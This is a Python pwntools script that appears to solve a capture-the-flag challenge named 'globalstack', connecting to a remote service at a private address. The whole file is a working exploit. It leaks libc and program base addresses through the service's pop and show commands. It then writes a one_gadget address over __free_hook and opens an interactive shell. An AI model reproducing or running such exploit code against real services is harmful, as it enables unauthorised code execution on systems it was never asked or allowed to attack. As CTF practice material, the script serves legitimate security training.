#!/usr/bin/env python3

from pwn import *

exe = ELF("./globalstack_patched",checksec=False)
libc = ELF("./libc-2.31.so",checksec=False)
ld = ELF("./ld-2.31.so",checksec=False)

context.binary = exe
#p = process()
p = remote('172.31.1.2', 11101)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001362
#           brva 0x00000000000013D3
#           ''')

p.sendlineafter(b'>> ',b'pop')

p.sendlineafter(b'>> ',b'show')
p.recvuntil(b'Stack top: ')

libc.address = int(p.recvline()[:-1]) - 0x1ec980
log.info(f'libc: {hex(libc.address)}')
for i in range(4):
    p.sendlineafter(b'>> ',b'pop')
p.sendlineafter(b'>> ',b'show')
p.recvuntil(b'Stack top: ')
exe.address = int(p.recvline()[:-1]) - 0x6d01136010
log.info(f'exe: {hex(exe.address)}')

one_gadget = [0xe3afe,0xe3b01,0xe3b04]

free_hook = libc.sym.__free_hook
libc_onegadget = libc.address + one_gadget[1]

input()
p.sendlineafter(b'>> ',b'pop')
p.sendlineafter(b'>> ',f'push {free_hook}'.encode())

p.sendlineafter(b'>> ',b'pop')
p.sendlineafter(b'>> ',f'push {libc_onegadget}'.encode())

p.sendlineafter(b'>> ',b'exit')


p.interactive()
